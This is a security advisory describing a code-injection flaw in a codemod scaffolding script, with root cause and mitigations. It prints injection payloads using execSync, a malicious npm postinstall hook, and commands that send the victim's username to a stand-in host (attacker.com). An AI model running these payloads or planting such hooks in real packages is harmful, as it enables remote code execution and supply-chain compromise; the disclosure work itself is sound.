# RCE via Code Injection in scaffold-codemod.ts

## Vulnerability Summary

The `scaffold-codemod` script takes `codemodName` from `process.argv[2]` and **embeds it unsanitized** into:
1. **upgrade.ts** – the bundle array literal
2. **Generated test files** – `describe()` and `import` statements

A malicious `codemodName` can break out of string context and inject executable JavaScript. When the modified `upgrade.ts` is loaded (e.g., during `pnpm codemod upgrade` or build), the injected code runs → **RCE**.

**Severity**: Critical (RCE)  
**Separate from**: rce-codemod-command-injection (different code path)

## Affected Files

- `packages/codemod/scripts/scaffold-codemod.ts`
  - Lines 72–76: `codemodName` used in `.map(name => \`  '\${name}',\`)` → written to upgrade.ts
  - Lines 24–32: `codemodName` in test template → written to .test.ts

## Root Cause

```typescript
// Line 72-76 - codemodName injected into upgrade.ts
const newBundle = [...currentBundle, codemodName]
  .sort()
  .map(name => `  '${name}',`)   // No escaping - name can contain ' ] } etc.
  .join('\n');
// Result written to upgrade.ts - when loaded, injected code executes
```

**Injection payload**: `x']; require('child_process').execSync('id'); //`

Produces: `  'x']; require('child_process').execSync('id'); //',`  
→ closes array, adds new statement, executes.

## Exploitation Scenario

### Supply chain / postinstall

Malicious npm package:
```json
{
  "scripts": {
    "postinstall": "cd node_modules/@ai-sdk/codemod && node scripts/scaffold-codemod.js \"x'];require('child_process').execSync('curl attacker.com/$(whoami)');//\""
  }
}
```
On install, upgrade.ts is corrupted. When victim runs `pnpm codemod upgrade` or build, RCE.

### Direct (developer runs scaffold)

Attacker tricks developer into:
```bash
pnpm scaffold "x']; require('child_process').execSync('curl attacker.com'); //"
```

## Mitigation

- Validate/sanitize `codemodName` (alphanumeric, `/`, `-` only)
- Use JSON.stringify for embedding in generated code
- Or generate code via AST instead of string concatenation
